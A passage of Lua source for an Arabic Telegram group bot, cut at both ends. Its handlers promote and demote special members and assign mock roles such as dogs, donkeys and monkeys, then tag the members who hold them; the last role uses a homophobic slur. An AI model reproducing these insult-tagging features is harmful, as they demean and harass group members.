send(msg.chat_id_, msg.id_, ' ◉ تم مسح المميزين')
end
if text == ("المميزين") and Mod(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n ◉ قائمة مميزين الجروب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمميزين") or text == ("صيح المميزين") then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n ◉ وينكم تعالو يريدوكم بالجروب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
local  statuss  = '\n ◉ تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مميز @(.*)$") and Mod(msg) then
local username = text:match("^رفع مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
local  statuss  = '\n ◉ تم ترقيته مميز'
texts = usertext..statuss
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^رفع مميز (%d+)$") and Mod(msg) then
local userid = text:match("^رفع مميز (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
local  statuss  = '\n ◉ تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
else
usertext = '\n ◉ العضو ← '..userid..''
local  statuss  = '\n ◉ تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
end;end,nil)
return false
end

if (text == ("تنزيل مميز")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز @(.*)$") and Mod(msg) then
local username = text:match("^تنزيل مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المميزين'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز (%d+)$") and Mod(msg) then
local userid = text:match("^تنزيل مميز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
------------------------------------------------------------------------
if text == 'مسح المتوحدين' and Mod(msg) then
database:del(bot_id..'Mote:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم مسح جميع المتوحدين')
end
if text == ("تاك للمتوحدين") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n ◉ قائمة متوحدين الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← المتوحد [@"..username.."]\n"
else
t = t..""..k.."← المتوحد `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد متوحدين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع متوحد") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ◉ تم رفع العضو متوحد في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل متوحد")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل العضو متوحد في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الزوجات' and Mod(msg) then
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم مسح جميع الزوجات')
end
if text == ("تاك للزوجات") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n ◉ قائمه زوجات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الزوجه [@"..username.."]\n"
else
t = t..""..k.."← الزوجه `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ مع الاسف لا يوجد زوجه"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع زوجتي") or text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ◉ تم رفع العضــو زوجه في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == ("تنزيل زوجتي") or text == ("طلاق") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل العضــو الزوجات من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الكلاب' and Mod(msg) then
database:del(bot_id..'Modde:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم مسح جميع الكلاب')
end
if text == ("تاك للكلاب") and Mod(msg) then
local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
t = "\n ◉ قائمه كلاب الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الكلب [@"..username.."]\n"
else
t = t..""..k.."← الكلب `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ مع الاسف لا يوجد كلاب"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع كلب") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ◉ تم رفع العضــو كلب في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل كلب")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل العضــو كلب من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'ممسح الحمير' and Mod(msg) then
database:del(bot_id..'Sakl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع حمير من الجروب')
end
if text == ("تاك للحمير") and Mod(msg) then
local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
t = "\n ◉ قائمة حمير الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الحمار [@"..username.."]\n"
else
t = t..""..k.."← الحمار `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد حمير"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع حمار") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع المتهم حمار بالجروب\n ◉ الان اصبح حمار الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if (text == ("تنزيل حمار")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل العضو حمار\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الوتكات' and Mod(msg) then
database:del(bot_id..'Motte:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع وتكات الجروب')
end
if text == ("تاك للوتكات") and Mod(msg) then
local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
t = "\n ◉ قائمة وتكات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الوتكه [@"..username.."]\n"
else
t = t..""..k.."← الوتكه `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد وتكات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع وتكه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع وتكه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل وتكه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل وتكه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح القرده' and Mod(msg) then
database:del(bot_id..'Motee:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع القرده بالجروب')
end
if text == ("تاك للقرود") and Mod(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n ◉ قائمة القرود الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← القرد [@"..username.."]\n"
else
t = t..""..k.."← القرد `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد قرد"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع قرد في الجروب\n ◉ تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل قرد من الجروب\n ◉ رجع موزه حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الارامل' and Mod(msg) then
database:del(bot_id..'Bro:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الارامل بالجروب')
end
if text == ("تاك للارامل") and Mod(msg) then
local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
t = "\n ◉ قائمة ارامل الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الارمله [@"..username.."]\n"
else
t = t..""..k.."← الارمله `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد ارامل"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع ارمله") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع ارمله في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل ارمله")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل ارمله من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الخولات' and Mod(msg) then
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخولات بالجروب')
end
if text == ("تاك للخولات") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n ◉ قائمة خولات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الخول [@"..username.."]\n"
else
t = t..""..k.."← الخول `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد خولات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع خول") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
